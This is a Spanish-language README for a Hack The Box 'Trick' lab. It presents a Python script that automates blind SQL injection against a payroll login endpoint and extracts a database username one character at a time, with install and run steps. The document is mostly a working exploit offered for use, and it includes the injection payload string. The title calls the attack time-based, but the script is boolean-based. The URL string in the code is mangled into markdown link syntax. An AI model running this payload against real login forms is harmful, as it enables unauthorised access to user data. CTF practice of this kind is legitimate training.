
# 🎯 Exploit SQLi Ciega Basada en Tiempo - HTB Trick

Este archivo contiene la documentación y el script en Python 3 diseñado para automatizar la explotación de una vulnerabilidad **Boolean/Time-Based SQL Injection** en el panel de autenticación de la máquina **Trick** de Hack The Box.

El script realiza un ataque de fuerza bruta posición por posición para extraer el nombre de usuario de la base de datos, optimizando el feedback visual en la terminal mediante barras de progreso dinámicas.

---

## 🚀 Características
* **Manejo de Señales:** Control limpio de interrupciones (`Ctrl + C`) para evitar volcados de error feos en la terminal.
* **Feedback Visual:** Implementación de `pwntools` para mostrar el progreso en tiempo real de los caracteres probados y el resultado obtenido.
* **Automatización:** Descubrimiento automatizado del string carácter por carácter evaluando las respuestas del servidor (`requests`).

---

## 🛠️ Requisitos e Instalación

El script requiere Python 3 y las librerías `requests` y `pwntools`. Puedes instalarlas ejecutando:

```bash
pip3 install pwntools requests --break-system-packages

```

---

## 💻 Script de Automatización (Python 3)

Puedes copiar este bloque de código directamente y guardarlo en tu máquina como `payload.py`:

```python
#!/usr/bin/env python3

import requests
import string
import sys
import time
import signal
from pwn import *

# Configuración del manejador para salir limpiamente con Ctrl+C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "[http://preprod-payroll.trick.htb/ajax.php?action=login](http://preprod-payroll.trick.htb/ajax.php?action=login)"
characters = string.ascii_lowercase + "-_"

def makeRequest():
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    
    time.sleep(2)
    username = ""
    p2 = log.progress("Usuario")
    
    # Bucle para recorrer posición por posición (hasta 20 caracteres)
    for position in range(1, 20):
        for character in range(len(characters)):
            current_char = characters[character]
            
            # Formateamos el payload inyectando la posición y el carácter actual
            payload = "' or (select substring(username,%d,1) from users limit 1)='%s'-- -" % (position, current_char)
            
            post_data = {
                'username': payload,
                'password': 'test'
            }
            
            p1.status(post_data['username'])
            
            # Realizamos la petición POST al servidor
            r = requests.post(login_url, data=post_data)
            
            # Si el servidor responde "1", significa que la condición es verdadera (True)
            if r.text == "1":
                username += current_char
                p2.status(username)
                break

if __name__ == '__main__':
    makeRequest()

```

---

## ⚙️ Modo de Uso

1. Asegúrate de tener conectada tu VPN de Hack The Box y que el dominio `preprod-payroll.trick.htb` apunte correctamente en tu archivo `/etc/hosts`.
2. Guarda el código de arriba en un archivo llamado `payload.py`.
3. Dale permisos de ejecución al script:
```bash
chmod +x payload.py

```


4. Ejecuta el exploit:
```bash
./payload.py

```



